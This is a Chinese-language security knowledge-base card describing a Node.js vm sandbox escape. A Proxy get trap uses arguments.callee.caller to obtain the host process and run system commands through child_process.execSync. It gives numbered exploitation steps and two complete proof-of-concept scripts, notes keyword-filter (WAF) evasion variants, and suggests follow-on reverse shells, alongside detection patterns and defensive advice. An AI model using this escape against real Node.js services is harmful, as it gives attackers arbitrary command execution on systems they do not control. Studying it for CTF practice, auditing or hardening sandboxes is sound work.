---
id: binary-pwn-sandbox-escape-nodejs-vm-proxy-callee-caller
title: Node.js vm 沙箱 Proxy 陷阱逃逸：宿主访问属性/字符串化触发 get 陷阱，arguments.callee.caller 取宿主函数
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: nodejs-vm-proxy-trap-callee-caller-escape
tags:
- javascript
- nodejs
- vm
- sandbox-escape
- proxy
- arguments-callee-caller
- child-process
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V401
  verified_at: '2026-11-09T12:58:40+08:00'
  notes: 已对照原文核对：Proxy get 陷阱两段 PoC（宿主 console.log(res.abc) 读取属性、catch 中 "error:"+e 字符串化）与原文『VM沙箱的特殊沙箱对象』Proxy 小节一致；原理（arguments.callee.caller→caller.constructor.constructor→process.mainModule.require→execSync）与原文一致。dedup 核对：top 候选 nodejs-vm-object-create-null-callee-caller（cosine 0.9426，append_scenario），--force 理由成立——候选卡触发点为宿主对返回值做 toString 隐式转换，本卡为宿主读取 Proxy 属性或对抛出的 Proxy 字符串化时触发 get 陷阱，触发条件与 PoC 明显不同，且原文将 Proxy 作为无 toString 触发点时的独立兜底手法，已与候选卡互链。路径 binary/pwn/sandbox-escape 合法；frontmatter 无 sources/source/source_url/文章 ID；原文未给版本区间，affected_versions 已 --clear。未验证点：原文未提供这两段 Proxy PoC 的运行截图（仅 toString 变体有图），未在本机复跑 PoC。dup-scan.json（2026-11-08）早于本卡建卡（2026-11-09），且其中无涉及本卡的 pair。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-nodejs-vm-proxy-callee-caller/
draft: false
kb_aliases:
- Node.js vm Proxy 逃逸
- Proxy get 陷阱逃逸
- 沙箱返回 Proxy 属性访问逃逸
- throw Proxy catch 逃逸
- arguments.callee.caller Proxy
- Object.create(null) 无 toString 触发点逃逸
---

## 一句话结论

当 `Object.create(null)` 等加固写法让 vm 沙箱内拿不到可爬的 `constructor`、且宿主侧没有会调用沙箱对象 `toString` 的代码时，可以让沙箱返回（或抛出）一个包着 `get` 陷阱的 `Proxy`：宿主只要读取该对象的任意属性（如 `console.log(res.abc)`），或在 `catch` 中对抛出的 `Proxy` 做字符串拼接，就会触发陷阱；陷阱内的 `arguments.callee.caller` 指向宿主 realm 的调用函数，再经 `caller.constructor.constructor('return process')()` 取回宿主 `process`，用 `process.mainModule.require('child_process').execSync()` 执行任意系统命令。

## 原理

- `vm.createContext(Object.create(null))` 让沙箱全局对象没有原型链，`this.constructor` 为 `undefined`，经典的 `this.constructor.constructor` 链断开。此时逃逸需要一个“沙箱内定义的函数被宿主代码调用”的时机，才能从 `arguments.callee.caller` 拿到宿主 realm 的函数对象。
- `toString` 劫持依赖宿主对返回值做字符串拼接/打印；如果宿主只是把返回值原样丢回、不再做任何隐式转换，就没有触发点。`Proxy` 把可触发面扩大：`get` 陷阱会在宿主读取代理对象任意属性时执行，`has`/`ownKeys`/`apply` 等陷阱也分别对应 `in`、`Object.keys`、函数调用等宿主操作。
- 关键不是 Proxy 本身提供了新能力，而是“陷阱函数由宿主调用栈触发”：陷阱是沙箱脚本里定义的非严格函数，V8 在宿主代码执行属性访问/类型转换时调用它，非严格模式下 `arguments.callee` 是陷阱函数本身，`arguments.callee.caller` 就是宿主侧的调用者函数。
- 宿主函数的 `constructor` 是宿主 `Function`，`Function('return process')()` 在宿主 realm 求值并返回宿主 `process`；`process.mainModule.require('child_process').execSync(cmd)` 以 Node 进程权限执行命令。沙箱全局没有 `process`/`require`，这一步绕过了该限制。
- 两种投递方式：
  - **返回 Proxy**：沙箱返回 `new Proxy({}, {get: ...})`，宿主对返回值做任何属性读取（`res.abc`、`res.message`、`JSON.stringify` 等）都会命中 `get` 陷阱。
  - **抛出 Proxy**：沙箱 `throw new Proxy(...)`，宿主 `catch (e)` 后执行 `console.log("error:" + e)` 等字符串化/属性读取操作，`ToPrimitive` 会先读 `Symbol.toPrimitive`、再读 `toString`/`valueOf`，同样命中 `get` 陷阱。
- 边界：该技巧依赖非严格模式（严格模式下访问 `arguments.callee` 抛 `TypeError`）；`function.caller` 的行为与引擎/运行时版本有关，卡内 confidence 标 medium。宿主若对返回值做深拷贝/结构化克隆、或只做不需要读取属性的转发，触发面会缩小。

## 触发条件

- Node.js 应用用 `vm.createContext(Object.create(null))`（或类似无原型上下文）+ `vm.runInContext/runInNewContext` 执行用户可控脚本。
- 宿主代码会接触沙箱返回/抛出的对象：读取属性、拼接到字符串、打印、`JSON.stringify`、遍历键等；完全丢弃返回值且不 catch 异常时无触发点。
- 沙箱脚本非严格模式（脚本或包裹函数没有 `"use strict"`，陷阱用普通 `function` 定义而非箭头函数）。
- Node.js 入口为 CommonJS，`process.mainModule` 可用；ESM/新版本需改用其它取模块方式。
- 宿主未对跨边界对象做深拷贝/代理清洗。

## 利用步骤

1. 确认沙箱上下文是 `Object.create(null)`（源码或行为上 `this.constructor` 不可用），且宿主会访问沙箱返回值的属性或对异常对象做字符串化。
2. 在沙箱脚本中创建 `Proxy`，在 `get` 陷阱内取 `arguments.callee.caller`。
3. 用 `caller.constructor.constructor('return process')()` 取宿主 `process`。
4. `process.mainModule.require('child_process').execSync('whoami')` 执行命令并返回结果字符串。
5. 按触发方式投递：返回 Proxy 让宿主读属性，或 throw Proxy 让宿主 catch 后字符串化；命令输出随宿主输出回显。
6. 验证成功后替换为读文件、反弹 Shell 等后续命令。

## PoC

返回 Proxy，宿主读取属性触发（最小化自原文示例）：

```javascript
const vm = require('vm');

const script = `
(() => {
    const a = new Proxy({}, {
        get: function () {
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    });
    return a;
})()`;

const context = vm.createContext(Object.create(null));
const res = vm.runInContext(script, context);
console.log(res.abc);   // 宿主读取属性 -> 触发 get 陷阱 -> 执行 whoami
```

抛出 Proxy，宿主 catch 中字符串化触发：

```javascript
const vm = require('vm');

const script = `
throw new Proxy({}, {
    get: function () {
        const cc = arguments.callee.caller;
        const p = (cc.constructor.constructor('return process'))();
        return p.mainModule.require('child_process').execSync('whoami').toString();
    }
})`;

try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
} catch (e) {
    console.log("error:" + e);   // ToPrimitive 读取属性 -> 触发 get 陷阱
}
```

说明：原文未给出这两个 Proxy 示例的实际运行截图（仅 toString 变体有运行结果图），机制按 V8 非严格模式行为描述；PoC 未在本机执行。

## 变体与关联

- 变体（触发陷阱）：`has` + `in`、`ownKeys` + `Object.keys`、`apply` + 宿主调用函数、`getPrototypeOf` + `Object.getPrototypeOf` 等；任何宿主发起的、会落到 Proxy 内部方法上的操作都可作为触发点。
- 变体（隐式转换）：返回普通对象并重写 `toString`/`valueOf`/`toJSON`/`Symbol.toPrimitive`，由宿主的字符串拼接、数值运算、`JSON.stringify` 触发——与 Proxy 同属“宿主隐式调用沙箱代码”这一根因。
- 变体（结合 WAF 绕过）：陷阱内部不写敏感字面量，改用 `'Process'.toLowerCase()`、`String.fromCharCode`、`Reflect.ownKeys` 子串定位等，可在关键字正则过滤下完成同一逃逸。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-object-create-null-callee-caller]] 是同一原语在 `toString` 触发点下的版本，本卡补充“宿主只做属性读取/异常字符串化”时的 Proxy 触发面。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass]] 用 throw Proxy + `e.message` 触发并叠加 WAF 绕过，是本卡技巧在 NKCTF 题目中的完整链。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]] 是上下文有原型时的 `this.constructor.constructor` 逃逸，触发条件不同。
- 关联：[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]] 从 vm2 角度系统总结了 Proxy trap/隐式调用这类跨 realm 边界问题。

## 检测与防御

- 检测：用户脚本中出现 `new Proxy`、`arguments.callee`、`caller`；宿主代码对沙箱返回值直接做属性访问、字符串拼接、`JSON.stringify`、打印；异常处理把沙箱抛出的对象交给字符串化/属性读取。
- 防御：不要把进程内 `vm` 当安全边界；用 `isolated-vm` 或独立进程/容器执行不可信代码并限制权限、网络与文件系统。
- 若必须保留 vm：对跨边界返回值做结构化克隆/JSON 序列化（会剥离函数与 Proxy 行为），不要直接访问其属性或参与字符串运算；沙箱脚本强制严格模式可阻断 `arguments.callee`，但只是提高门槛，不能作为安全边界。
- 监控：Node 进程异常派生子进程、沙箱接口返回体中出现命令输出（`uid=`、主机名等）。
